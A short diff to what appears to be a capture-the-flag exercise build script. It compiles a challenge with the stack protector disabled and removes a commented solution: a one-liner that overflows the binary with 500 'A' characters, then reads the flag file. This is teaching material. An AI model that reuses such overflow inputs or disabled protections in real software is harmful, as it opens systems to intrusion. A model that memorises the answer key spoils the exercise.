@@ -5,6 +5,4 @@ parse-template template.c \
             -c "gcc challenge.c -Wall -o challenge -fno-stack-protector" \
             -o challenge.c
 
-# solution:
-# $ (python3 -c "print('A'*500)"; cat -) | ./task/student/step1/challenge
-# $ cat /task/student/end/flag
+# need ASLR disabled ...
